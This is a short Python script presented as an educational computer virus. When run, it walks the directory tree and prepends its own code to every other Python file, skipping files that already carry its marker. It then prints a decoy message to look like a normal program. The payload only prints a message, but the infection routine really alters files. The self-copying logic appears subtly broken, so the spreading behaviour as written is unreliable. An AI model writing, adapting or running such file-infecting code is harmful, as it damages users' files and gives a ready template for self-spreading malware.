#!/usr/bin/env python3
import os
import sys

# === PAYLOAD ===
# This is the malicious part. In a real virus, this could be anything.
# For our educational purposes, it just prints a message.
def payload():
    print("!!! PAYLOAD TRIGGERED: File has been infected! !!!")

# === REPLICATION (INFECTION) LOGIC ===
def replicate():
    # Get the virus's own code
    virus_code = get_own_code()

    # Walk through the current directory and all subdirectories
    for root, dirs, files in os.walk("."):
        for file_name in files:
            # Skip non-Python files, and skip ourselves to avoid infinite replication
            if not file_name.endswith('.py') or file_name == os.path.basename(__file__):
                continue

            file_path = os.path.join(root, file_name)
            # Read the target file
            with open(file_path, 'r') as f:
                file_content = f.read()

            # Check if the file is already infected to avoid multiple infections
            if "!!! PAYLOAD TRIGGERED" not in file_content:
                # Prepend the virus code to the target file
                new_content = virus_code + "\n" + file_content
                # Write the new, infected content back to the file
                with open(file_path, 'w') as f:
                    f.write(new_content)
                print(f"Infected: {file_path}")

# === HELPER FUNCTION ===
def get_own_code():
    # Read the current file and get all the code
    with open(sys.argv[0], 'r') as f:
        own_code = f.read()
    # Find the start of the payload function to avoid copying itself multiple times if run
    # This is a simple way to isolate the virus code.
    parts = own_code.split('def payload():')
    # Return the first part (the virus code) and the payload function definition
    return parts[0] + 'def payload():' + parts[1].split('def replicate():')[0]

# === MAIN EXECUTION ===
if __name__ == '__main__':
    # First, replicate the virus
    replicate()
    # Then, execute the payload
    payload()
    # Finally, print a harmless message to make the original program seem normal
    print("Hello from the original program!")